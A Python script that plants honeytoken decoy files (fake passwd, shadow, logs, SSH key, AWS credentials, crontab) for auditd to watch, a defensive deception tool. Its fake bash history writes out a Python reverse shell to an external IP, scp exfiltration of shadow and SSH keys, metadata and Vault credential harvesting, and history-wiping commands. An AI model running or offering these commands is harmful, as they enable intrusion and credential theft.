#!/usr/bin/env python3
"""
ATDP Decoy File Generator
Run as root on the CentOS VM: sudo python3 generate_decoys.py

Creates 8 realistic honeytokens that an automated parser or AI recon tool
will treat as genuine high-value targets, then writes auditd rules to watch
every path for open/read access.
"""

import os
import sys
import stat
import random
import string
import textwrap
import base64
from datetime import datetime, timedelta

# ── Safety guard ──────────────────────────────────────────────────────────────
if os.geteuid() != 0:
    sys.exit("[!] Must be run as root. Use: sudo python3 generate_decoys.py")


def write_file(path, content, mode=0o600):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(content)
    os.chmod(path, mode)
    print(f"[+] Created: {path}  ({len(content.splitlines())} lines, mode {oct(mode)})")


# ── Helpers ───────────────────────────────────────────────────────────────────

def fake_sha512_hash():
    """Generate a realistic-looking SHA-512 crypt hash (mathematically invalid)."""
    salt_chars = string.ascii_letters + string.digits + "./"
    salt = "".join(random.choices(salt_chars, k=16))
    hash_chars = string.ascii_letters + string.digits + "./"
    hash_body = "".join(random.choices(hash_chars, k=86))
    return f"$6${salt}${hash_body}"


def random_ip(prefix="10.0"):
    return f"{prefix}.{random.randint(1,50)}.{random.randint(1,254)}"


def random_port():
    return random.randint(40000, 65000)


def ts(offset_hours=0, offset_minutes=0, fmt="%b %d %H:%M:%S"):
    """Generate a log timestamp offset from now."""
    t = datetime.now() - timedelta(hours=offset_hours, minutes=offset_minutes)
    return t.strftime(fmt)


# ══════════════════════════════════════════════════════════════════════════════
# FILE 1: /etc/passwd.bak  (40 lines, realistic passwd format)
# ══════════════════════════════════════════════════════════════════════════════

def generate_passwd_bak():
    lines = [
        "root:x:0:0:root:/root:/bin/bash",
        "bin:x:1:1:bin:/bin:/sbin/nologin",
        "daemon:x:2:2:daemon:/sbin:/sbin/nologin",
        "adm:x:3:4:adm:/var/adm:/sbin/nologin",
        "lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin",
        "sync:x:5:0:sync:/sbin:/bin/sync",
        "shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown",
        "halt:x:7:0:halt:/sbin:/sbin/halt",
        "mail:x:8:12:mail:/var/spool/mail:/sbin/nologin",
        "operator:x:11:0:operator:/root:/sbin/nologin",
        "games:x:12:100:games:/usr/games:/sbin/nologin",
        "ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin",
        "nobody:x:99:99:Nobody:/:/sbin/nologin",
        "systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin",
        "dbus:x:81:81:System message bus:/:/sbin/nologin",
        "polkitd:x:999:998:User for polkitd:/:/sbin/nologin",
        "sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin",
        "postfix:x:89:89::/var/spool/postfix:/sbin/nologin",
        "chrony:x:998:996::/var/lib/chrony:/sbin/nologin",
        "ntp:x:38:38::/etc/ntp:/sbin/nologin",
        # Service accounts — these are the "high value" targets for AI recon
        "svc_workday:x:1001:1001:Workday Integration Service:/home/svc_workday:/bin/bash",
        "db_admin:x:1002:1002:Database Administrator:/home/db_admin:/bin/bash",
        "deploy_svc:x:1003:1003:Deployment Service Account:/home/deploy_svc:/bin/bash",
        "hr_api_user:x:1004:1004:HR API Integration:/home/hr_api_user:/bin/bash",
        "svc_reporting:x:1005:1005:Reporting Service:/home/svc_reporting:/bin/bash",
        "k8s_operator:x:1006:1006:Kubernetes Operator:/home/k8s_operator:/bin/bash",
        "svc_splunk:x:1007:1007:Splunk Forwarder Service:/home/svc_splunk:/bin/bash",
        "svc_ansible:x:1008:1008:Ansible Automation:/home/svc_ansible:/bin/bash",
        "vault_agent:x:1009:1009:HashiCorp Vault Agent:/home/vault_agent:/bin/bash",
        "svc_jenkins:x:1010:1010:Jenkins CI Service:/home/svc_jenkins:/bin/bash",
        "mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin",
        "postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash",
        "nginx:x:997:995:Nginx web server:/var/lib/nginx:/sbin/nologin",
        "redis:x:996:994:Redis In-Memory Data Store:/var/lib/redis:/sbin/nologin",
        "prometheus:x:995:993:Prometheus Monitoring:/var/lib/prometheus:/sbin/nologin",
        "grafana:x:994:992:Grafana Dashboard:/usr/share/grafana:/sbin/nologin",
        "etcd:x:993:991:etcd key-value store:/var/lib/etcd:/sbin/nologin",
        "alice:x:2001:2001:Alice Chen - Platform SRE:/home/alice:/bin/bash",
        "bob:x:2002:2002:Bob Nakamura - DevOps Lead:/home/bob:/bin/bash",
        "carol:x:2003:2003:Carol Rivera - Security Engineer:/home/carol:/bin/bash",
    ]
    return "\n".join(lines) + "\n"


# ══════════════════════════════════════════════════════════════════════════════
# FILE 2: /etc/shadow.old  (matching shadow file, fake SHA-512 hashes)
# ══════════════════════════════════════════════════════════════════════════════

def generate_shadow_old():
    """
    Format: username:hashed_password:lastchg:min:max:warn:inactive:expire:reserved
    lastchg = days since Jan 1 1970 (use ~19700 for a date ~2 years ago)
    """
    locked = "!!"
    nologin = "*"
    lastchg = str(random.randint(19200, 19700))

    def shadow_entry(user, has_password=True, locked_acc=False):
        if locked_acc:
            pw = locked
        elif has_password:
            pw = fake_sha512_hash()
        else:
            pw = nologin
        return f"{user}:{pw}:{lastchg}:0:99999:7:::"

    lines = [
        shadow_entry("root"),
        shadow_entry("bin", has_password=False),
        shadow_entry("daemon", has_password=False),
        shadow_entry("adm", has_password=False),
        shadow_entry("lp", has_password=False),
        shadow_entry("sync", has_password=False),
        shadow_entry("shutdown", has_password=False),
        shadow_entry("halt", has_password=False),
        shadow_entry("mail", has_password=False),
        shadow_entry("operator", has_password=False),
        shadow_entry("games", has_password=False),
        shadow_entry("ftp", has_password=False),
        shadow_entry("nobody", has_password=False),
        shadow_entry("systemd-network", has_password=False),
        shadow_entry("dbus", has_password=False),
        shadow_entry("polkitd", has_password=False),
        shadow_entry("sshd", has_password=False),
        shadow_entry("postfix", has_password=False),
        shadow_entry("chrony", has_password=False),
        shadow_entry("ntp", has_password=False),
        # Service accounts — all have "passwords", attractive to credential attacks
        shadow_entry("svc_workday"),
        shadow_entry("db_admin"),
        shadow_entry("deploy_svc"),
        shadow_entry("hr_api_user"),
        shadow_entry("svc_reporting"),
        shadow_entry("k8s_operator"),
        shadow_entry("svc_splunk"),
        shadow_entry("svc_ansible"),
        shadow_entry("vault_agent"),
        shadow_entry("svc_jenkins"),
        shadow_entry("mysql", has_password=False),
        shadow_entry("postgres"),
        shadow_entry("nginx", has_password=False),
        shadow_entry("redis", has_password=False),
        shadow_entry("prometheus", has_password=False),
        shadow_entry("grafana", has_password=False),
        shadow_entry("etcd", has_password=False),
        shadow_entry("alice"),
        shadow_entry("bob"),
        shadow_entry("carol"),
    ]
    return "\n".join(lines) + "\n"


# ══════════════════════════════════════════════════════════════════════════════
# FILE 3: /var/log/auth.log.1  (200 lines, realistic SSH auth log)
# ══════════════════════════════════════════════════════════════════════════════

def generate_auth_log():
    """
    Mix of: failed logins (bulk), sudo usage, one successful login from
    a suspicious external IP, and normal internal access.
    """
    lines = []
    hostname = "prod-api-01"
    pid_base = 10000

    suspicious_ip = "185.220.101.47"  # Known Tor exit node range
    internal_ip = "10.0.1.50"
    admin_ip = "10.0.1.20"

    users_to_bruteforce = [
        "root", "admin", "ubuntu", "ec2-user", "deploy", "svc_workday",
        "db_admin", "test", "git", "oracle", "postgres", "hadoop",
        "ftp", "jenkins", "nagios", "deploy_svc", "hr_api_user",
    ]

    # Early morning brute force (attacker wave 1)
    for i, user in enumerate(users_to_bruteforce * 5):
        h, m = divmod(i * 2, 60)
        ts_str = f"Jan 15 0{2 + h // 60}:{m:02d}:{(i * 7) % 60:02d}"
        pid = pid_base + i
        lines.append(
            f"{ts_str} {hostname} sshd[{pid}]: Failed password for invalid user "
            f"{user} from {suspicious_ip} port {40000 + i} ssh2"
        )

    # Normal daytime activity
    normal_events = [
        f"Jan 15 08:01:14 {hostname} sshd[11500]: Accepted publickey for alice from {internal_ip} port 52100 ssh2",
        f"Jan 15 08:01:14 {hostname} sshd[11500]: pam_unix(sshd:session): session opened for user alice by (uid=0)",
        f"Jan 15 08:04:22 {hostname} sudo[11510]:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx",
        f"Jan 15 08:15:00 {hostname} sshd[11520]: Accepted publickey for bob from {admin_ip} port 53200 ssh2",
        f"Jan 15 08:15:01 {hostname} sshd[11520]: pam_unix(sshd:session): session opened for user bob by (uid=0)",
        f"Jan 15 08:20:33 {hostname} sudo[11530]:     bob : TTY=pts/1 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u postgresql -n 100",
        f"Jan 15 09:00:00 {hostname} sshd[11600]: Accepted publickey for deploy_svc from {internal_ip} port 54300 ssh2",
        f"Jan 15 09:00:01 {hostname} sshd[11600]: pam_unix(sshd:session): session opened for user deploy_svc by (uid=0)",
        f"Jan 15 09:00:05 {hostname} sudo[11610]: deploy_svc : TTY=pts/2 ; PWD=/home/deploy_svc ; USER=root ; COMMAND=/usr/bin/systemctl restart app-worker",
        f"Jan 15 10:30:00 {hostname} sshd[11700]: Failed password for alice from 203.0.113.10 port 55000 ssh2",
        f"Jan 15 10:30:15 {hostname} sshd[11701]: Failed password for alice from 203.0.113.10 port 55001 ssh2",
        f"Jan 15 10:30:30 {hostname} sshd[11702]: Accepted password for alice from 203.0.113.10 port 55002 ssh2",
        f"Jan 15 11:45:00 {hostname} sshd[11800]: pam_unix(sshd:session): session closed for user alice",
        f"Jan 15 12:00:00 {hostname} sshd[11900]: Accepted publickey for svc_workday from {internal_ip} port 56000 ssh2",
    ]
    lines.extend(normal_events)

    # The suspicious successful login — attacker gains access
    lines.extend([
        f"Jan 15 02:47:03 {hostname} sshd[12000]: Failed password for root from {suspicious_ip} port 49000 ssh2",
        f"Jan 15 02:47:05 {hostname} sshd[12001]: Failed password for root from {suspicious_ip} port 49001 ssh2",
        f"Jan 15 02:47:07 {hostname} sshd[12002]: Accepted password for root from {suspicious_ip} port 49002 ssh2",
        f"Jan 15 02:47:07 {hostname} sshd[12002]: pam_unix(sshd:session): session opened for user root by (uid=0)",
        f"Jan 15 02:47:08 {hostname} sudo[12010]:     root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/find / -name '*.bak' -o -name '*.old' 2>/dev/null",
        f"Jan 15 02:47:09 {hostname} sudo[12011]:     root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd.bak",
        f"Jan 15 02:47:10 {hostname} sudo[12012]:     root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /root/.aws/credentials.bak",
        f"Jan 15 02:47:12 {hostname} sshd[12002]: pam_unix(sshd:session): session closed for user root",
    ])

    # Afternoon normal activity
    afternoon = [
        f"Jan 15 14:00:00 {hostname} sshd[13000]: Accepted publickey for carol from {admin_ip} port 57000 ssh2",
        f"Jan 15 14:00:01 {hostname} sshd[13000]: pam_unix(sshd:session): session opened for user carol by (uid=0)",
        f"Jan 15 14:05:00 {hostname} sudo[13010]:    carol : TTY=pts/4 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/sbin/aureport -au",
        f"Jan 15 14:10:00 {hostname} sudo[13011]:    carol : TTY=pts/4 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/ausearch -k decoy_access",
        f"Jan 15 16:00:00 {hostname} sshd[14000]: Accepted publickey for db_admin from {internal_ip} port 58000 ssh2",
        f"Jan 15 16:30:00 {hostname} sshd[14000]: pam_unix(sshd:session): session closed for user db_admin",
        f"Jan 15 17:00:00 {hostname} sshd[15000]: Received disconnect from {internal_ip} port 52100:11: disconnected by user",
    ]
    lines.extend(afternoon)

    return "\n".join(lines[:200]) + "\n"


# ══════════════════════════════════════════════════════════════════════════════
# FILE 4: /var/log/secure.bak  (150 lines, CentOS-style)
# ══════════════════════════════════════════════════════════════════════════════

def generate_secure_bak():
    hostname = "prod-db-01"
    suspicious_ip = "185.220.101.47"
    internal_ip = "10.0.2.30"
    lines = []

    users = ["root", "admin", "mysql", "postgres", "db_admin", "oracle",
             "backup_svc", "monitoring", "svc_workday", "vagrant", "centos"]

    # Brute force wave
    for i, user in enumerate(users * 7):
        m, s = divmod(i * 4, 60)
        ts_str = f"Jan 14 03:{m:02d}:{s:02d}"
        pid = 20000 + i
        lines.append(
            f"{ts_str} {hostname} sshd[{pid}]: pam_unix(sshd:auth): "
            f"authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
            f"rhost={suspicious_ip}  user={user}"
        )

    # sudo activity and PAM events
    pam_events = [
        f"Jan 14 08:05:00 {hostname} su[22000]: pam_unix(su:session): session opened for user root by db_admin(uid=1002)",
        f"Jan 14 08:05:01 {hostname} su[22000]: + pts/0 db_admin:root",
        f"Jan 14 08:10:00 {hostname} sudo[22010]:  db_admin : TTY=pts/0 ; PWD=/home/db_admin ; USER=root ; COMMAND=/usr/bin/mysqldump -u root --all-databases",
        f"Jan 14 08:10:01 {hostname} sudo[22011]:  db_admin : TTY=pts/0 ; PWD=/home/db_admin ; USER=root ; COMMAND=/usr/bin/mysqladmin -u root status",
        f"Jan 14 09:00:00 {hostname} sshd[22100]: Accepted publickey for alice from {internal_ip} port 60000 ssh2",
        f"Jan 14 09:00:00 {hostname} sshd[22100]: pam_unix(sshd:session): session opened for user alice by (uid=0)",
        f"Jan 14 09:15:00 {hostname} sudo[22110]:    alice : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/mysqld.log",
        f"Jan 14 11:00:00 {hostname} crond[22200]: pam_unix(crond:session): session opened for user root by (uid=0)",
        f"Jan 14 11:00:01 {hostname} crond[22200]: pam_unix(crond:session): session closed for user root",
        f"Jan 14 12:00:00 {hostname} crond[22300]: pam_unix(crond:session): session opened for user mysql by (uid=0)",
        f"Jan 14 13:30:00 {hostname} sshd[22400]: Accepted publickey for vault_agent from {internal_ip} port 61000 ssh2",
        f"Jan 14 13:30:01 {hostname} sshd[22400]: pam_unix(sshd:session): session opened for user vault_agent by (uid=0)",
        f"Jan 14 13:35:00 {hostname} sudo[22410]: vault_agent : TTY=pts/2 ; PWD=/home/vault_agent ; USER=root ; COMMAND=/usr/bin/vault status",
        f"Jan 14 14:00:00 {hostname} sshd[22500]: pam_unix(sshd:session): session closed for user alice",
        f"Jan 14 15:00:00 {hostname} polkitd[1]: Registered Authentication Agent for unix-process:23000:1234567 (system bus name :1.100)",
        f"Jan 14 17:00:00 {hostname} sudo[23000]:    carol : TTY=pts/3 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/sbin/ausearch -k decoy_access --start today",
        f"Jan 14 17:30:00 {hostname} sshd[23100]: Received disconnect from {internal_ip}: 11: Bye Bye",
        f"Jan 14 17:30:00 {hostname} sshd[23100]: pam_unix(sshd:session): session closed for user carol",
    ]
    lines.extend(pam_events)

    return "\n".join(lines[:150]) + "\n"


# ══════════════════════════════════════════════════════════════════════════════
# FILE 5: /root/.ssh/id_rsa.bak  (valid PEM FORMAT, invalid key material)
# ══════════════════════════════════════════════════════════════════════════════

def generate_id_rsa_bak():
    """
    Looks exactly like a 2048-bit RSA private key.
    The base64 body is random bytes — structurally valid PEM, cryptographically
    invalid. No authentication will ever succeed with this key.
    """
    random_bytes = bytes([random.randint(0, 255) for _ in range(1190)])
    b64 = base64.b64encode(random_bytes).decode()
    # Wrap at 64 chars as per PEM standard
    wrapped = "\n".join(b64[i:i+64] for i in range(0, len(b64), 64))
    return f"-----BEGIN RSA PRIVATE KEY-----\n{wrapped}\n-----END RSA PRIVATE KEY-----\n"


# ══════════════════════════════════════════════════════════════════════════════
# FILE 6: /root/.bash_history.old  (60 commands)
# ══════════════════════════════════════════════════════════════════════════════

def generate_bash_history():
    commands = [
        "ssh -i ~/.ssh/id_rsa svc_workday@10.0.1.100",
        "ssh -i ~/.ssh/deploy_key deploy_svc@10.0.2.50",
        "ssh db_admin@10.0.3.10",
        "ssh -L 5432:10.0.3.10:5432 alice@bastion.internal",
        "ssh -i ~/.ssh/id_rsa root@10.0.1.200",
        "mysql -u root -p -h 10.0.3.10",
        "mysql -u db_admin -p workday_prod -h 10.0.3.10 -e 'SELECT user,authentication_string FROM mysql.user;'",
        "mysqldump -u root -p --all-databases > /tmp/db_backup_$(date +%Y%m%d).sql",
        "mysql -u root -p workday_staging < /tmp/restore.sql",
        "psql -U postgres -h 10.0.3.20 -d hr_database",
        "psql -U postgres -h 10.0.3.20 -c '\\du'",
        "cat /etc/shadow",
        "cat /etc/passwd | grep -v nologin",
        "cat /root/.aws/credentials",
        "cat /root/.ssh/id_rsa",
        "ls -la /root/.ssh/",
        "find / -name '*.pem' -o -name '*.key' 2>/dev/null",
        "find / -name 'credentials' -o -name '.aws' 2>/dev/null | head -20",
        "grep -r 'password' /etc/ 2>/dev/null | grep -v '#'",
        "grep -r 'secret' /opt/ 2>/dev/null",
        "aws configure",
        "aws s3 ls",
        "aws s3 sync s3://workday-prod-backups /tmp/s3_dump/",
        "aws iam list-users",
        "aws iam get-user",
        "aws secretsmanager list-secrets",
        "aws secretsmanager get-secret-value --secret-id prod/database/postgres",
        "kubectl get secrets -n production",
        "kubectl get secrets -n production -o yaml",
        "kubectl get pods --all-namespaces",
        "kubectl exec -it app-pod-7d9f8b-xvz2q -- /bin/sh",
        "kubectl describe secret postgres-credentials -n production",
        "vault kv get secret/prod/database",
        "vault kv list secret/prod/",
        "vault token lookup",
        "curl -H 'X-Vault-Token: hvs.EXAMPLE' http://vault.internal:8200/v1/secret/data/prod/aws",
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "curl -s http://169.254.169.254/latest/meta-data/hostname",
        "netstat -tulpn",
        "ss -tulpn",
        "ps aux | grep -E 'vault|postgres|mysql|redis'",
        "env | grep -E 'AWS|SECRET|TOKEN|PASS|KEY'",
        "printenv | grep -i secret",
        "crontab -l",
        "cat /etc/crontab",
        "systemctl list-units --type=service --state=running",
        "journalctl -u postgresql -n 200",
        "tail -f /var/log/secure",
        "ausearch -k decoy_access",
        "tar czf /tmp/sensitive.tar.gz /etc/passwd /etc/shadow /root/.ssh/",
        "scp /tmp/sensitive.tar.gz attacker@185.220.101.47:/tmp/",
        "nc -lvnp 4444",
        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"185.220.101.47\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "history -c",
        "unset HISTFILE",
        "export HISTSIZE=0",
        "rm -f ~/.bash_history",
        "shred -u ~/.bash_history",
    ]
    return "\n".join(commands[:60]) + "\n"


# ══════════════════════════════════════════════════════════════════════════════
# FILE 7: /etc/crontab.bak  (realistic cron with internal service names)
# ══════════════════════════════════════════════════════════════════════════════

def generate_crontab_bak():
    return """\
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=ops-alerts@corp.internal
HOME=/root

# Field order: minute hour day-of-month month day-of-week user command
# ─────────────────────────────────────────────────────────────────────

# Database backups — runs nightly, rotates 7 days
0  2  *  *  *  db_admin    /opt/scripts/backup_postgres.sh --host 10.0.3.20 --db workday_prod --dest /mnt/backup/postgres/ >> /var/log/backup_postgres.log 2>&1
0  2  *  *  *  mysql       /opt/scripts/backup_mysql.sh --all-databases --compress --dest /mnt/backup/mysql/ >> /var/log/backup_mysql.log 2>&1
30 2  *  *  *  root        /opt/scripts/sync_backups_s3.sh --bucket workday-prod-backups --prefix db/ >> /var/log/s3_sync.log 2>&1

# AWS credentials rotation (Vault-managed)
0  6  *  *  *  vault_agent /usr/local/bin/vault-agent -config=/etc/vault/agent.hcl renew >> /var/log/vault_agent.log 2>&1
0  6  *  *  *  root        /opt/scripts/rotate_aws_creds.sh --role workday-prod-role >> /var/log/cred_rotation.log 2>&1

# HR API data sync — every 6 hours
0  */6  *  *  *  hr_api_user  /opt/workday/hr_sync/run_sync.py --env prod --endpoint https://api.workday.com/hr/v2 >> /var/log/hr_sync.log 2>&1

# Service health checks
*/5  *  *  *  *  monitoring  /opt/monitoring/check_services.sh 2>&1 | /usr/bin/logger -t health_check
*/2  *  *  *  *  root        /opt/monitoring/check_postgres.sh --host 10.0.3.20 --alert-webhook https://hooks.slack.com/services/TXXXXXXXX/BXXXXXXXX/XXXXXXXX

# Kubernetes token refresh
0  */4  *  *  *  k8s_operator  kubectl --kubeconfig /home/k8s_operator/.kube/prod_config get pods --all-namespaces >> /var/log/k8s_health.log 2>&1

# Log rotation and cleanup
0  0  *  *  *  root    /usr/sbin/logrotate /etc/logrotate.conf
0  3  *  *  0  root    /opt/scripts/cleanup_tmp.sh --older-than 7d --dirs /tmp /var/tmp

# Deploy pipeline trigger (webhook listener)
*/1  *  *  *  *  deploy_svc  /opt/deploy/check_webhook.sh --token-file /home/deploy_svc/.deploy_token >> /var/log/deploy_webhook.log 2>&1

# Security audit log export to SIEM
0  *  *  *  *  root    /opt/siem/export_auditd.sh --dest splunk-hec.internal:8088 --token-file /etc/siem/hec_token >> /var/log/siem_export.log 2>&1

# Ansible playbook — configuration drift correction
0  4  *  *  *  svc_ansible  /usr/bin/ansible-playbook /opt/ansible/playbooks/enforce_baseline.yml --inventory /opt/ansible/inventory/prod.ini >> /var/log/ansible_drift.log 2>&1
"""


# ══════════════════════════════════════════════════════════════════════════════
# FILE 8: /root/.aws/credentials.bak  (fake AWS credentials, boto3 format)
# ══════════════════════════════════════════════════════════════════════════════

def generate_aws_credentials_bak():
    """
    AKIAIOSFODNN7EXAMPLE style: AKIA + 16 uppercase alphanumeric chars.
    Secret key: 40-char base64-like string. These are NOT real credentials.
    """
    def fake_access_key():
        return "AKIA" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))

    def fake_secret_key():
        chars = string.ascii_letters + string.digits + "/+"
        return "".join(random.choices(chars, k=40))

    def fake_session_token():
        chars = string.ascii_letters + string.digits + "/+="
        return "".join(random.choices(chars, k=356))

    prod_key = fake_access_key()
    prod_secret = fake_secret_key()
    staging_key = fake_access_key()
    staging_secret = fake_secret_key()
    ops_key = fake_access_key()
    ops_secret = fake_secret_key()
    session_token = fake_session_token()

    return f"""\
# AWS credentials backup — created by rotate_aws_creds.sh on {ts(fmt='%Y-%m-%d')}
# DO NOT COMMIT — contains production IAM credentials
# Vault path: secret/prod/aws/workday-role

[default]
aws_access_key_id = {prod_key}
aws_secret_access_key = {prod_secret}
region = us-east-1
output = json

[workday-prod]
aws_access_key_id = {prod_key}
aws_secret_access_key = {prod_secret}
aws_session_token = {session_token}
region = us-east-1
output = json
# Role: arn:aws:iam::123456789012:role/workday-prod-role
# Expires: {ts(offset_hours=-2, fmt='%Y-%m-%dT%H:%M:%SZ')}

[workday-staging]
aws_access_key_id = {staging_key}
aws_secret_access_key = {staging_secret}
region = us-east-1
output = json
# Role: arn:aws:iam::123456789012:role/workday-staging-role

[ops-deploy]
aws_access_key_id = {ops_key}
aws_secret_access_key = {ops_secret}
region = us-east-1
output = json
# Used by: deploy_svc, svc_ansible
# Permissions: s3:PutObject, s3:GetObject, ecr:GetAuthorizationToken, ecs:UpdateService
"""


# ══════════════════════════════════════════════════════════════════════════════
# MAIN — create all decoys
# ══════════════════════════════════════════════════════════════════════════════

DECOYS = [
    ("/etc/passwd.bak",               generate_passwd_bak,           0o644),
    ("/etc/shadow.old",               generate_shadow_old,           0o600),
    ("/var/log/auth.log.1",           generate_auth_log,             0o640),
    ("/var/log/secure.bak",           generate_secure_bak,           0o600),
    ("/root/.ssh/id_rsa.bak",         generate_id_rsa_bak,           0o600),
    ("/root/.bash_history.old",       generate_bash_history,         0o600),
    ("/etc/crontab.bak",              generate_crontab_bak,          0o644),
    ("/root/.aws/credentials.bak",    generate_aws_credentials_bak,  0o600),
]

def main():
    print("=" * 60)
    print("ATDP Decoy File Generator")
    print("=" * 60)

    for path, generator, mode in DECOYS:
        content = generator()
        write_file(path, content, mode)

    print()
    print("[+] All decoy files created.")
    print()
    print("Next step — load auditd rules:")
    print("  sudo cp audit.rules /etc/audit/rules.d/atdp-decoys.rules")
    print("  sudo augenrules --load")
    print("  sudo systemctl restart auditd")
    print()
    print("Verify auditd is watching decoy paths:")
    print("  sudo auditctl -l | grep decoy_access")
    print()
    print("Test a decoy file access (should trigger alert):")
    print("  cat /etc/passwd.bak")
    print("  sudo ausearch -k decoy_access --start today")


if __name__ == "__main__":
    main()
